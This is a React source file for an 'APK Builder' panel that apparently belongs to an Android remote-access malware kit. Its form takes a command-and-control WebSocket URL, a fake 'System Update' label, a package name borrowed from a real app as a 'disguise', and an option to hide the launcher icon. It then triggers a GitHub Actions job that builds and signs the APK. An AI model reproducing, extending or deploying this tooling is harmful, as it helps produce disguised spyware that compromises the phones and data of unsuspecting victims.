import { useState, useEffect, useCallback, useRef } from 'react';
import { api } from '../lib/api';

const inputStyle = {
  width: '100%', padding: '10px 12px', background: '#0a0a0f',
  border: '1px solid #1e1e2a', borderRadius: 5, color: '#ddd',
  fontSize: 13, outline: 'none', boxSizing: 'border-box',
};
const labelStyle = {
  display: 'block', fontSize: 10, color: '#555', letterSpacing: 1.5,
  textTransform: 'uppercase', marginBottom: 6,
};

function fileToBase64(file) {
  return new Promise((ok, no) => {
    const r = new FileReader();
    r.onload = () => ok(String(r.result).split(',')[1] || '');
    r.onerror = no;
    r.readAsDataURL(file);
  });
}

function RunRow({ run }) {
  const color = run.conclusion === 'success' ? '#00d26a'
    : run.conclusion === 'failure' ? '#ff4444'
    : '#f90';
  const state = run.conclusion || run.status;
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px', borderBottom: '1px solid #14141c', fontSize: 12 }}>
      <span style={{ width: 8, height: 8, borderRadius: '50%', background: color, boxShadow: `0 0 6px ${color}`, flexShrink: 0 }} />
      <span style={{ color: '#bbb', minWidth: 60 }}>#{run.number}</span>
      <span style={{ color, textTransform: 'capitalize', minWidth: 80 }}>{state}</span>
      <span style={{ color: '#444', flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
        {run.inputs?.app_label || run.inputs?.apk_name || ''}
      </span>
      <a href={run.url} target="_blank" rel="noreferrer" style={{ color: '#00d26a', textDecoration: 'none' }}>logs</a>
    </div>
  );
}

export default function BuilderTab() {
  const [cfg, setCfg] = useState(null);
  const [c2, setC2] = useState('');
  const [label, setLabel] = useState('');
  const [appId, setAppId] = useState('com.estrongs.android.pop');
  const [hideIcon, setHideIcon] = useState('false');
  const [apkName, setApkName] = useState('');
  const [logoUrl, setLogoUrl] = useState('');
  const [logoPreview, setLogoPreview] = useState(null);
  const [logoB64, setLogoB64] = useState('');
  const [busy, setBusy] = useState(false);
  const [msg, setMsg] = useState(null);       // {kind: 'ok'|'err', text}
  const [runs, setRuns] = useState([]);
  const pollRef = useRef(null);

  const loadRuns = useCallback(async () => {
    try { setRuns(await api.builderRuns(10)); } catch { /* status unavailable */ }
  }, []);

  useEffect(() => {
    api.builderConfig()
      .then(c => { setCfg(c); if (c.defaultC2) setC2(c.defaultC2); })
      .catch(() => setCfg({ configured: false }));
    loadRuns();
    pollRef.current = setInterval(loadRuns, 15000);
    return () => clearInterval(pollRef.current);
  }, [loadRuns]);

  async function onLogoFile(e) {
    const f = e.target.files?.[0];
    if (!f) return;
    if (f.size > 900_000) { setMsg({ kind: 'err', text: 'Logo too large — max ~650KB PNG' }); return; }
    const b64 = await fileToBase64(f);
    setLogoB64(b64);
    setLogoPreview(URL.createObjectURL(f));
    setMsg(null);
  }

  async function submit(e) {
    e.preventDefault();
    setBusy(true); setMsg(null);
    try {
      await api.builderTrigger({
        c2_url: c2.trim(),
        app_label: label.trim(),
        app_id: appId.trim() || 'com.estrongs.android.pop',
        hide_icon: hideIcon,
        apk_name: apkName.trim(),
        logo_base64: logoB64,
        logo_url: logoUrl.trim(),
      });
      setMsg({ kind: 'ok', text: 'Build dispatched — watch the run list below' });
      setTimeout(loadRuns, 3000);
    } catch (er) {
      setMsg({ kind: 'err', text: er.message || 'Dispatch failed' });
    } finally { setBusy(false); }
  }

  return (
    <div style={{ flex: 1, overflowY: 'auto', background: '#0a0a0f', padding: '24px 20px' }}>
      <div style={{ maxWidth: 560, margin: '0 auto' }}>

        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 4 }}>
          <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#00d26a', boxShadow: '0 0 8px #00d26a' }} />
          <span style={{ fontSize: 15, fontWeight: 700, color: '#e0e0e0', letterSpacing: 2, textTransform: 'uppercase' }}>APK Builder</span>
        </div>
        <div style={{ fontSize: 11, color: '#444', marginBottom: 22 }}>
          {cfg?.configured
            ? `repo: ${cfg.repo} · workflow: ${cfg.workflow}`
            : 'builder not configured — set GH_TOKEN + GH_REPO env vars on the server'}
        </div>

        {msg && (
          <div style={{
            fontSize: 12, borderRadius: 5, padding: '9px 12px', marginBottom: 16,
            color: msg.kind === 'ok' ? '#00d26a' : '#ff4444',
            background: msg.kind === 'ok' ? '#0a1a12' : '#1a0f0f',
            border: `1px solid ${msg.kind === 'ok' ? '#123a24' : '#3a1515'}`,
          }}>{msg.text}</div>
        )}

        <form onSubmit={submit}>
          <label style={labelStyle}>C2 WebSocket URL</label>
          <input value={c2} onChange={e => setC2(e.target.value)} placeholder="wss://your-app.onrender.com/ws" spellCheck={false} style={{ ...inputStyle, marginBottom: 16 }} />

          <label style={labelStyle}>App Label (visible name)</label>
          <input value={label} onChange={e => setLabel(e.target.value)} placeholder="System Update" style={{ ...inputStyle, marginBottom: 16 }} />

          <label style={labelStyle}>Package Name (disguise)</label>
          <input value={appId} onChange={e => setAppId(e.target.value)} spellCheck={false} style={{ ...inputStyle, marginBottom: 16 }} />

          <label style={labelStyle}>Final APK Name (rename — no extension)</label>
          <input value={apkName} onChange={e => setApkName(e.target.value)} placeholder="SystemUpdate_v1" spellCheck={false} style={{ ...inputStyle, marginBottom: 16 }} />

          <label style={labelStyle}>Hide Launcher Icon</label>
          <select value={hideIcon} onChange={e => setHideIcon(e.target.value)} style={{ ...inputStyle, marginBottom: 20 }}>
            <option value="false">No — keep icon visible</option>
            <option value="true">Yes — hide after first run</option>
          </select>

          <label style={labelStyle}>App Icon (logo)</label>
          <div style={{ display: 'flex', gap: 14, alignItems: 'center', marginBottom: 8 }}>
            <div style={{
              width: 64, height: 64, borderRadius: 12, background: '#111118',
              border: '1px solid #1e1e2a', display: 'flex', alignItems: 'center',
              justifyContent: 'center', overflow: 'hidden', flexShrink: 0,
            }}>
              {logoPreview
                ? <img src={logoPreview} alt="logo" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
                : <span style={{ fontSize: 10, color: '#333' }}>no icon</span>}
            </div>
            <div style={{ flex: 1 }}>
              <input type="file" accept="image/png,image/jpeg" onChange={onLogoFile}
                style={{ fontSize: 12, color: '#555', width: '100%' }} />
              <input value={logoUrl} onChange={e => setLogoUrl(e.target.value)} placeholder="…or paste icon URL"
                spellCheck={false} style={{ ...inputStyle, marginTop: 8 }} />
            </div>
          </div>

          <button type="submit" disabled={busy || !c2 || !cfg?.configured}
            style={{
              width: '100%', padding: '12px 0', marginTop: 10,
              background: busy ? '#0d3a20' : '#00613a', border: 'none', borderRadius: 5,
              color: '#fff', fontSize: 13, fontWeight: 600, cursor: busy ? 'wait' : 'pointer',
              letterSpacing: 1,
            }}>
            {busy ? 'Dispatching…' : 'Build & Sign APK'}
          </button>
        </form>

        <div style={{ marginTop: 28 }}>
          <div style={{ fontSize: 10, color: '#555', letterSpacing: 1.5, textTransform: 'uppercase', marginBottom: 8 }}>
            Recent Builds
          </div>
          <div style={{ background: '#111118', border: '1px solid #1e1e2a', borderRadius: 8, overflow: 'hidden' }}>
            {runs.length === 0 && <div style={{ padding: '14px', fontSize: 12, color: '#333' }}>no runs yet</div>}
            {runs.map(r => <RunRow key={r.id} run={r} />)}
          </div>
        </div>

      </div>
    </div>
  );
}
